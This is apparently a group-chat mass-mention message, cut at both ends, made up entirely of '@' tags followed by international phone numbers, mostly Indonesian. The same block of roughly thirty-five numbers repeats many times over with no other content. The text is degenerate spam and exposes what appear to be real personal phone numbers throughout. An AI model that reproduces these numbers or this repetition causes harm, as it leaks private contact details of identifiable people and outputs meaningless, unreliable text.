813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 17-591 8769⁩ @⁨+55 43 9971-4035⁩ @⁨+62 813-3567-9820⁩ @⁨+62 812-1352-5199⁩ @⁨+62 822-7579-8648⁩ @⁨+62 853-3313-9107⁩ @⁨+62 859-3447-1650⁩ @⁨+20 115 091 4277⁩ @⁨+62 831-2036-2382⁩ @⁨+55 61 9403-8067⁩ @⁨+62 813-3567-9820⁩ @⁨+212 772-912685⁩ @⁨+62 813-8817-2925⁩ @⁨+55 43 9971-4035⁩ @⁨+62 821-1096-1632⁩ @⁨+62 838-7934-9198⁩ @⁨+62 857-4563-1867⁩ @⁨+62 878-5992-0435⁩ @⁨+55 61 9403-8067⁩ @⁨+60 11-5184 8577⁩ @⁨+62 822-1373-4882⁩ @⁨+62 852-7961-7736⁩ @⁨+62 857-8309-0709⁩ @⁨+62 882-8983-1824⁩ @⁨+62 895-1612-1656⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+62 852-7961-7736⁩ @⁨+94 76 118 4650⁩ @⁨+92 317 6489820⁩ @⁨+62 812-1914-1306⁩ @⁨+62 857-5063-6420⁩ @⁨+20 101 469 8287⁩ @⁨+60 17-928 2314⁩ @⁨+60 